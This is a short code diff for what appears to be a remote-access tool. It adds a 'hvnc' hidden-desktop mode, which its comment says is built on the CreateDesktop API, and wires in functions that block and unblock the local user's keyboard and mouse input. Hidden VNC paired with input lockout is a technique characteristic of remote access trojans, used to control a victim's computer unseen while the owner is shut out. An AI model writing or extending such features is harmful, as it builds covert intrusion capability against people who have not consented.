@@ -30,6 +30,9 @@ def _normalize_mode(mode: str | None) -> str:
         return "view"
     if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
         return "hidden"
+    # HVNC mode - forces true hidden desktop via CreateDesktop API
+    if value in {"hvnc", "hiddenvnc", "createdesktop"}:
+        return "hvnc"
     # Support new printwindow mode explicitly
     if value in {"printwindow", "print_window", "print-window", "pw"}:
         return "printwindow"
@@ -143,6 +146,17 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 fps: int | None,
             ) -> None:
                 hidden_session.screen_track.set_profile(profile, width, height, fps)
+            
+            # Input blocking support for hidden/hvnc modes
+            def _set_input_blocking(enabled: bool) -> bool:
+                if enabled:
+                    return hidden_session.block_local_input()
+                else:
+                    hidden_session.unblock_local_input()
+                    return True
+            
+            def _get_input_blocked() -> bool:
+                return getattr(hidden_session, '_input_blocked', False)
 
             return SessionResources(
                 control_handler,
@@ -150,6 +164,8 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 close=hidden_session.close,
                 launch_app=_hidden_launch_app,
                 set_stream_profile=_set_stream_profile,
+                set_input_blocking=_set_input_blocking,
+                get_input_blocked=_get_input_blocked,
             )
 
     controller = InputController()
